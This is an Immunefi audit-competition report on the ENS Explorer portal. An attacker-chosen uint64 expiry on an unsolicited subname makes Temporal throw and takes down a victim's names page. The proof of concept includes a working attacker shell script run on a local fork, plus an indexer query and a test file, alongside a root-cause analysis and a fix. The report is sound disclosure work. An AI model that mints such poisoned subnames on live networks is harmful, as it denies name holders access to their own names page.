# 90307 w a low explorer renders an unbounded on chain uint64 expiry through temporal without a range check so one unsolicited subname permanently breaks a victim s names page

**Submitted on Aug 24th 2026 at 10:32:59 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90307
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Taking down the application/website

## Description

## Summary

The Explorer converts a v2 name's expiry from on-chain seconds with `new Date(expiryDate * 1000)` and formats the result through `Temporal.PlainDate`. The on-chain type is `uint64`. Any expiry above 8,640,000,000,000 seconds exceeds the ECMAScript time-value range, so `new Date(...)` yields `Invalid Date`.

`Invalid Date` is an object and therefore truthy, so the `if (!expiryDate)` guard in all three copies of the expiry cell does not fire. Execution reaches `dateToPlainDate`, which builds `Temporal.PlainDate.from({ year: NaN, month: NaN, day: NaN })` and throws `RangeError: Non-finite day: NaN` during render.

In ENSv2 a name's subregistry is a contract its owner deploys and controls. `register(string label, address owner, address registry, address resolver, uint256 roleBitmap, uint64 expiry)` takes both the recipient and the expiry from the caller with no ceiling, and the resulting name is an ERC-1155 token the recipient never accepts. An attacker mints a subname to a victim with an expiry inside the dangerous range, and the victim's `/addr/<victim>/names` page throws on every load from then on.

Everything below was measured on a local anvil fork of Sepolia pinned at block **11556240**, against the real deployed ENSv2 contracts and a local Panoptes indexer. No transaction was sent to any live network.

## Impact

`/addr/<victim>/names` renders every name the address owns with no pagination, so one poisoned row is enough to take that page down. It is the page a name holder uses to see what they own, when it expires, and to start a renewal or an extension.

The victim cannot clear it. The token arrived without consent, the Explorer offers no way to hide or reject an incoming name, and the row is regenerated from the indexer on every load, so the page is dead until the victim transfers the unwanted token away using some other tool. The broken page gives them no way to discover that.

Cost per victim, measured on the fork: 170,595 gas for the mint. The attacker's own registry is deployed once (176,153 gas) and reused for every victim.

Scope, stated precisely rather than inflated. `apps/portal/src/main.tsx:39-43` is a router-level catch boundary, so the routes that render this cell are replaced by a generic error card while the root layout and other routes keep working:

* `/addr/<victim>/names` goes down from a single poisoned name (no pagination, `routes/addr/$addr/names.tsx:406`).
* `/addr/<victim>` renders the same cell through `NameList` with `limit={3}` (`routes/addr/$addr/index.tsx:121`). The sort comparator returns `NaN` for a poisoned row, so V8 leaves it in place rather than hoisting it; that page only breaks when a poisoned row lands in the first three. Measured counter-example is in the PoC section.

## Root Cause

Three copies of one cell, none of them range-checking a value that is `uint64` on chain.

`apps/portal/src/utils/names/mergeNamesData.ts:104-107`

```tsx
      expiryDate:
        item.expiryDate !== null && item.expiryDate !== undefined
          ? new Date(item.expiryDate * MS_PER_SECOND)
          : null,
```

`apps/portal/src/features/names/components/NamesTable/columns.tsx:77-94`

```tsx
    cell: ({ row }) => {
      const expiryDate = row.original.expiryDate
      if (!expiryDate) {
        return (
          <Badge variant="secondary" className="text-xs">
            Does not expire
          </Badge>
        )
      }
      const isV2 = row.original.protocolVersion === 'ENSv2'
      const status = getNameStatus(expiryDate, isV2)
      return (
        <div className="flex items-center gap-2">
          <span>{formatDateTime(dateToPlainDate(expiryDate))}</span>
          {status === 'grace' && <GraceBadge />}
        </div>
      )
    },
```

`apps/portal/src/features/dashboard/components/NameList.tsx:48-65` is the same body. `apps/portal/src/features/names/components/NameMobileCard.tsx:63-68` is the third copy, and it is the branch `NamesTable` renders below the `md` breakpoint, so both viewports fail:

```tsx
      <div className="flex items-center gap-2">
        {expiryDate ? (
          <>
            <span className="text-base">
              {formatDateTime(dateToPlainDate(expiryDate))}
            </span>
```

The throwing conversion is `apps/portal/src/utils/temporal/index.ts:18-23`

```tsx
export const dateToPlainDate = (date: Date): Temporal.PlainDate =>
  Temporal.PlainDate.from({
    year: date.getFullYear(),
    month: date.getMonth() + 1,
    day: date.getDate(),
  })
```

The value arrives unvalidated from the indexer at `apps/portal/src/features/dashboard/hooks/useV2NamesWithRolesForAddress.ts:55-60`, which selects every domain owned by the address with no filter on registry or expiry:

```graphql
          domains(where: { owner: $account }) {
            name
            expiryDate
            subdomainCount
            recordCount
          }
```

There is no error boundary between the cell and the route:

```bash
$ grep -rn "errorComponent\|ErrorBoundary\|CatchBoundary\|componentDidCatch\|getDerivedStateFromError" apps/portal/src | grep -v "\.test\."
$ echo $?
1
```

The only handler is the router-wide fallback, `apps/portal/src/main.tsx:39-43`:

```tsx
  defaultErrorComponent: ({ error }) => {
    // The error page copy points users at the console for details.
    console.error(error)
    return <ErrorMessage className="mt-10" />
  },
```

### Scope check on the three-row overview

Run from `apps/portal`:

```bash
node -e "const mk=(n,s)=>({name:n,expiryDate:s===null?null:new Date(s*1000)});const rows=[mk('a',1700000000),mk('b',1800000000),mk('c',1900000000),mk('pwn',8640000000001),mk('d',2000000000),mk('e',2100000000)];const sorted=rows.toSorted((a,b)=>{if(!a.expiryDate&&!b.expiryDate)return 0;if(!a.expiryDate)return 1;if(!b.expiryDate)return -1;return a.expiryDate.getTime()-b.expiryDate.getTime()});console.log(sorted.map(r=>r.name).join(','));console.log('first 3:',sorted.slice(0,3).map(r=>r.name).join(','))"
```

Captured output:

```
a,b,c,pwn,d,e
first 3: a,b,c
```

The comparator returns `NaN`, so the poisoned row is not hoisted. This is why the report claims `/addr/<victim>/names` unconditionally and `/addr/<victim>` only when a poisoned row lands in the first three.

## Duplicate check

Checked against the program's published known-issues list and cleared. This is not R2-01, R2-02, SEC-MGR-003, SEC-MGR-008/011, SEC-MGR-010, EXP-INPUT-003, EXP-INPUT-005, EXP-INPUT-008, EXP-INPUT-009, EXP-4337-002, EXP-4337-003, SEC-TXM-002, R2-03, R2-06, EXP-GAP-006, R2-04, R2-05, or any of R3-01 through R3-08. It is not on the QA list or in the tracker excerpt (WEB-806, WEB-1303, WEB-1255, WEB-622, WEB-567, WEB-626, WEB-391, WEB-1188/1187, WEB-1259, WEB-1249, WEB-1148, WEB-1231, WEB-1301, WEB-1263, WEB-1304, WEB-1136, WEB-441, WEB-390, WEB-1257, WEB-699, WEB-1305, WEB-1233, WEB-716, WEB-580). The known-issues list contains no entry about expiry range handling, `Temporal`, or the names table.

The defect is in `apps/portal`, an in-scope asset. The indexer is out of scope as an asset and is not the subject of this report; it appears only as the transport that carries the on-chain value to the app unmodified, which the Part 2 transcript demonstrates.

## Suggested Fix

Clamp where the on-chain seconds become a `Date`, and treat an unrepresentable value as unknown.

In `mergeNamesData.ts` and `routes/addr/$addr/names.tsx`:

```tsx
const MAX_DATE_SECONDS = 8_640_000_000_000

const toExpiryDate = (seconds: number | null | undefined): Date | null => {
  if (seconds == null) return null
  if (!Number.isFinite(seconds) || seconds < 0 || seconds > MAX_DATE_SECONDS) return null
  return new Date(seconds * 1000)
}
```

Make `dateToPlainDate` total so no future caller can reintroduce the throw:

```tsx
export const dateToPlainDate = (date: Date): Temporal.PlainDate | null =>
  Number.isNaN(date.getTime())
    ? null
    : Temporal.PlainDate.from({
        year: date.getFullYear(),
        month: date.getMonth() + 1,
        day: date.getDate(),
      })
```

Fix the sort comparator so a non-finite date orders deterministically instead of returning `NaN`.

Independently, wrap the row-rendering surfaces in a per-row error boundary so one malformed indexer row degrades that row rather than the route.

## Proof of Concept

Three parts, all local. Fork pinned at Sepolia block 11556240.

{% stepper %}
{% step %}

## Part 0: bring up the pinned fork and a local indexer

```bash
cd e2e/infra
export PANOPTES_CONTRACTS_FILE=<repo>/findings/ens-2026-08-24/poc-indexer/contracts.local.json
docker compose -f docker-compose.yml \
  -f <repo>/findings/ens-2026-08-24/poc-indexer/docker-compose.override.yml \
  up -d anvil panoptes-indexer panoptes-api
```

The override pins anvil with `--fork-block-number 11556240` and starts only anvil plus Panoptes. `contracts.local.json` is the repo's own `e2e/infra/panoptes/contracts.json` with the v2 registry pointed at the address the app actually uses (`ensjs` Sepolia `ensRegistry`, `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`) and the start blocks moved to the pin so the indexer scans only fork-local blocks.

```bash
$ cast chain-id --rpc-url <http://127.0.0.1:8545>
11155111
$ cast block-number --rpc-url <http://127.0.0.1:8545>
11556240
```

{% endstep %}

{% step %}

## Part 1: the attacker path, real contracts, no impersonation inside the attack

`findings/ens-2026-08-24/poc-indexer/attacker-path.sh`

```bash
#!/usr/bin/env bash
# Attacker path with no impersonation inside the attack itself.
#  setup    : attacker acquires a .eth name (stand-in for an ordinary purchase)
#  attack   : attacker deploys their own UserRegistry, attaches it as the
#             subregistry of their name, and mints a subname to the victim
#             with an expiry they choose.
set -euo pipefail
RPC=http://127.0.0.1:8545
REG=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
RAR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
USERREG_IMPL=0x624a25d67B59D587752EbEc8DdeD8827dAe52050

# Fresh key: anvil's canned accounts carry EIP-7702 delegations on real Sepolia,
# which makes them invalid ERC-1155 receivers on a fork.
ATTACKER_KEY=0x16a33929f3a2931dbe4e32b01cd7685b106a60aa22846c56883c3be3bfa9a84e
ATTACKER=$(cast wallet address --private-key $ATTACKER_KEY)
VICTIM=0xCAfe000000000000000000000000000000000021
EXPIRY=8640000000001
ALL=0x1111111111111111111111111111111111111111111111111111111111111111
PARENT=attackerparent2

echo "attacker: $ATTACKER"
echo "victim:   $VICTIM"
echo -n "attacker code len: "; cast code --rpc-url $RPC $ATTACKER
cast rpc --rpc-url $RPC anvil_setBalance $ATTACKER 0x21e19e0c9bab2400000 > /dev/null

echo
echo "== SETUP: attacker acquires '$PARENT.eth' (normal 1y expiry) =="
NOW=$(cast block --rpc-url $RPC latest --field timestamp)
cast rpc --rpc-url $RPC anvil_impersonateAccount $RAR > /dev/null
cast rpc --rpc-url $RPC anvil_setBalance $RAR 0xde0b6b3a7640000 > /dev/null
cast send --rpc-url $RPC --unlocked --from $RAR "$REG" \
  "register(string,address,address,address,uint256,uint64)(uint256)" \
  "$PARENT" "$ATTACKER" 0x0000000000000000000000000000000000000000 \
  0x0000000000000000000000000000000000000000 "$ALL" $((NOW+31536000)) --json \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print('  tx',d['status'],'block',int(d['blockNumber'],16))"
cast rpc --rpc-url $RPC anvil_stopImpersonatingAccount $RAR > /dev/null
PARENT_TOKEN=$(cast call --rpc-url $RPC "$REG" "getTokenId(uint256)(uint256)" "$(cast keccak "$PARENT")" | awk '{print $1}')
echo "  parent tokenId: $PARENT_TOKEN"
echo -n "  parent owner:   "; cast call --rpc-url $RPC "$REG" "ownerOf(uint256)(address)" "$PARENT_TOKEN"

echo
echo "== ATTACK 1/3: attacker deploys their own UserRegistry via the real VerifiableFactory =="
INIT=$(cast calldata "initialize(address,uint256)" $ATTACKER $ALL)
DEPLOY_JSON=$(cast send --rpc-url $RPC --private-key $ATTACKER_KEY "$FACTORY" \
  "deployProxy(address,uint256,bytes)(address)" "$USERREG_IMPL" 4242 "$INIT" --json)
echo "$DEPLOY_JSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print('  tx',d['status'],'block',int(d['blockNumber'],16),'gasUsed',int(d['gasUsed'],16))"
SUBREG=$(echo "$DEPLOY_JSON" | python3 -c "
import sys,json
d=json.load(sys.stdin)
FACTORY='0x10dc6333cdfe1fcef624c6e0a8221b91804cd7ef'
TOPIC0='0x0a2c575ff341b41da136c9ccae74ec230a927a024d18f0dccf46d123f28f5f54'  # ProxyDeployed
for l in d['logs']:
    if l['address'].lower()==FACTORY and l['topics'][0].lower()==TOPIC0:
        print('0x'+l['topics'][2][-40:]); break
")
echo "  attacker subregistry: $SUBREG"
echo -n "  subregistry code len: "; cast code --rpc-url $RPC "$SUBREG" | wc -c

echo
echo "== ATTACK 2/3: attach it as the subregistry of the attacker's own name =="
cast send --rpc-url $RPC --private-key $ATTACKER_KEY "$REG" \
  "setSubregistry(uint256,address)" "$PARENT_TOKEN" "$SUBREG" --json \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print('  tx',d['status'],'block',int(d['blockNumber'],16))"
echo -n "  getSubregistry('$PARENT'): "; cast call --rpc-url $RPC "$REG" "getSubregistry(string)(address)" "$PARENT"

echo
echo "== ATTACK 3/3: mint 'pwn.$PARENT.eth' to the victim with expiry=$EXPIRY =="
cast send --rpc-url $RPC --private-key $ATTACKER_KEY "$SUBREG" \
  "register(string,address,address,address,uint256,uint64)(uint256)" \
  "pwn" "$VICTIM" 0x0000000000000000000000000000000000000000 \
  0x0000000000000000000000000000000000000000 "$ALL" "$EXPIRY" --json \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print('  tx',d['status'],'block',int(d['blockNumber'],16),'gasUsed',int(d['gasUsed'],16))"
SUBTOKEN=$(cast call --rpc-url $RPC "$SUBREG" "getTokenId(uint256)(uint256)" "$(cast keccak "pwn")" | awk '{print $1}')
echo -n "  subname getExpiry: "; cast call --rpc-url $RPC "$SUBREG" "getExpiry(uint256)(uint64)" "$SUBTOKEN" | awk '{print $1}'
echo -n "  subname ownerOf:   "; cast call --rpc-url $RPC "$SUBREG" "ownerOf(uint256)(address)" "$SUBTOKEN"
```

Captured output:

```
attacker: 0xCb79025557A23ce6ED3329806ee176B529102D0f
victim:   0xCAfe000000000000000000000000000000000021
attacker code len: 0x

== SETUP: attacker acquires 'attackerparent2.eth' (normal 1y expiry) ==
  tx 0x1 block 11556252
  parent tokenId: 56145694289869741273558810077679705221298117436328380238798149748875228872704
  parent owner:   0xCb79025557A23ce6ED3329806ee176B529102D0f

== ATTACK 1/3: attacker deploys their own UserRegistry via the real VerifiableFactory ==
  tx 0x1 block 11556253 gasUsed 176153
  attacker subregistry: 0x9c8bb794144b5bd34a0e0e38a4573dddd4e7cb98
  subregistry code len:      157

== ATTACK 2/3: attach it as the subregistry of the attacker's own name ==
  tx 0x1 block 11556254
  getSubregistry('attackerparent2'): 0x9c8Bb794144b5Bd34A0E0E38a4573ddDd4e7Cb98

== ATTACK 3/3: mint 'pwn.attackerparent2.eth' to the victim with expiry=8640000000001 ==
  tx 0x1 block 11556255 gasUsed 170595
  subname getExpiry: 8640000000001
  subname ownerOf:   0xcAFE000000000000000000000000000000000021
```

Only the SETUP step impersonates, and only to hand the attacker a name they would otherwise buy. All three ATTACK steps are ordinary transactions signed by the attacker's own key.
{% endstep %}

{% step %}

## Part 2: the indexer round trip

The indexer discovers the attacker's registry by itself. From `docker logs infra-panoptes-indexer-1`:

```
info: Synced v2 to block 11556252
info: Indexing v2 from block 11556253 to 11556254 (2 blocks)
info: Backfilling 1 newly discovered subregistry from block 11556240 to 11556252
info:   Backfilling subregistry 0x9c8bb794144b5bd34a0e0e38a4573dddd4e7cb98 events from block 11556240 to 11556252
info:   No historical events found for subregistry 0x9c8bb794144b5bd34a0e0e38a4573dddd4e7cb98
info:     Fetched 2 events, processed 1, skipped 0 (unknown contracts)
info: Subregistry indexing: 1 ENS events + 0 transfers from 2 subregistries
info: Progress: 100.0% (2/2 blocks) - Batch 11556253-11556254 indexed
info: Synced v2 to block 11556254
info: Indexing v2 from block 11556255 to 11556255 (1 blocks)
info:     Fetched 2 events, processed 2, skipped 0 (unknown contracts)
info: Subregistry indexing: 2 ENS events + 1 transfers from 2 subregistries
info: Progress: 100.0% (1/1 blocks) - Batch 11556255-11556255 indexed
info: Synced v2 to block 11556255
```

Then the app's own query, verbatim from `useV2NamesWithRolesForAddress.ts:55-60`:

```bash
python3 - <<'PY'
import urllib.request, json
def gql(q):
    body = json.dumps({'query': q}).encode()
    req = urllib.request.Request('<http://127.0.0.1:5655/graphql>', data=body,
                                 headers={'Content-Type':'application/json'})
    return json.loads(urllib.request.urlopen(req, timeout=15).read().decode())
q = '{ domains(where: { owner: "0xcafe000000000000000000000000000000000021" }) { name expiryDate } }'
print(json.dumps(gql(q)['data']['domains'], indent=2))
PY
```

Captured output:

```json
[
  {
    "name": "pwn.attackerparent2.eth",
    "expiryDate": 8640000000001
  }
]
```

A boundary sweep establishes the usable range. Six names were registered with different expiries and read back through the same query:

```
A normal        -> [{"name": "sweepnormal.eth", "expiryDate": 1819101102}]
B 8.64e12       -> [{"name": "sweepboundary.eth", "expiryDate": 8640000000000}]
C 8.64e12+1     -> [{"name": "sweepoverflow.eth", "expiryDate": 8640000000001}]
D uint64 max    -> [{"name": "sweepmax.eth", "expiryDate": null}]
E 2^63-1        -> [{"name": "sweep63max.eth", "expiryDate": 9223372036854775807}]
F 2^63          -> [{"name": "sweep63.eth", "expiryDate": null}]
```

The indexer stores the expiry in a signed 64-bit column, so `type(uint64).max` comes back as `null` and renders harmlessly as "Does not expire". Every value in **8,640,000,000,001 to 9,223,372,036,854,775,807** survives intact, which is the whole range the attacker needs.
{% endstep %}

{% step %}

## Part 3: the app breaks on exactly that value

Save as `apps/portal/poc-expiry-brick.test.ts`. Run from `apps/portal`:

```bash
pnpm exec vitest run poc-expiry-brick.test.ts --reporter=verbose
```

```tsx
/**
 * End-to-end PoC, app half.
 *
 * The input below is the literal JSON the LOCAL Panoptes indexer returned for
 * the victim after the attacker minted a subname in their own subregistry on a
 * pinned Sepolia fork (block 11556240):
 *
 *   { "domains": [ { "name": "pwn.attackerparent2.eth",
 *                    "expiryDate": 8640000000001 } ] }
 *
 * Network free: imports only the production modules on the defect path.
 */
import { describe, expect, it } from 'vitest'
import { formatDateTime } from '@/utils/formatting/formatDateTime'
import { mergeNamesData } from '@/utils/names/mergeNamesData'
import { dateToPlainDate } from '@/utils/temporal'

// Exactly what the indexer returned.
const INDEXER_RESPONSE = {
  domains: [{ name: 'pwn.attackerparent2.eth', expiryDate: 8640000000001 }],
}

// Largest expiry a JS Date can represent, in seconds.
const MAX_SAFE_EXPIRY_SECONDS = 8_640_000_000_000
// Largest expiry the indexer will hand back (SQLite signed 64-bit).
const MAX_INDEXABLE_EXPIRY_SECONDS = 9_223_372_036_854_775_807

// The body of the expiry cell in
// features/names/components/NamesTable/columns.tsx:78-93,
// features/dashboard/components/NameList.tsx:49-65 and
// features/names/components/NameMobileCard.tsx:62-68.
const renderExpiryCell = (expiryDate: Date | null) => {
  if (!expiryDate) return 'Does not expire'
  return formatDateTime(dateToPlainDate(expiryDate))
}

describe('PoC: the indexer row the attacker created breaks the Explorer names table', () => {
  it('1. the production transform turns the indexer row into a truthy Invalid Date', () => {
    const merged = mergeNamesData(
      undefined,
      INDEXER_RESPONSE.domains.map((d) => ({
        name: d.name,
        expiryDate: d.expiryDate,
        roleBitmap: '0x0',
        subdomainCount: 0,
        recordCount: 0,
      })),
    )
    const d = merged[0].expiryDate as Date
    expect(d).toBeInstanceOf(Date)
    expect(Number.isNaN(d.getTime())).toBe(true)
    expect(Boolean(d)).toBe(true) // the `if (!expiryDate)` guard does not fire
  })

  it('2. the expiry cell throws RangeError on that row', () => {
    const d = new Date(INDEXER_RESPONSE.domains[0].expiryDate * 1000)
    expect(() => renderExpiryCell(d)).toThrowError(/Non-finite/)
  })

  it('3. the whole indexer-reachable range above the Date limit throws', () => {
    for (const secs of [
      MAX_SAFE_EXPIRY_SECONDS + 1,
      1e14,
      1e17,
      MAX_INDEXABLE_EXPIRY_SECONDS,
    ]) {
      expect(() => renderExpiryCell(new Date(secs * 1000))).toThrowError(
        /Non-finite/,
      )
    }
  })

  it('4. control: the largest in-range expiry renders', () => {
    expect(renderExpiryCell(new Date(MAX_SAFE_EXPIRY_SECONDS * 1000))).toMatch(
      /275760/,
    )
  })

  it('5. control: an ordinary expiry renders', () => {
    expect(renderExpiryCell(new Date(1_819_101_102 * 1000))).toMatch(/2027/)
  })
})
```

Captured output:

```
 RUN  v4.1.5 /Users/bp/x/ens/1/apps/portal
 ✓ poc-expiry-brick.test.ts > PoC: the indexer row the attacker created breaks the Explorer names table > 1. the production transform turns the indexer row into a truthy Invalid Date 1ms
 ✓ poc-expiry-brick.test.ts > PoC: the indexer row the attacker created breaks the Explorer names table > 2. the expiry cell throws RangeError on that row 0ms
 ✓ poc-expiry-brick.test.ts > PoC: the indexer row the attacker created breaks the Explorer names table > 3. the whole indexer-reachable range above the Date limit throws 0ms
 ✓ poc-expiry-brick.test.ts > PoC: the indexer row the attacker created breaks the Explorer names table > 4. control: the largest in-range expiry renders 9ms
 ✓ poc-expiry-brick.test.ts > PoC: the indexer row the attacker created breaks the Explorer names table > 5. control: an ordinary expiry renders 0ms

 Test Files  1 passed (1)
      Tests  5 passed (5)
```

{% endstep %}
{% endstepper %}
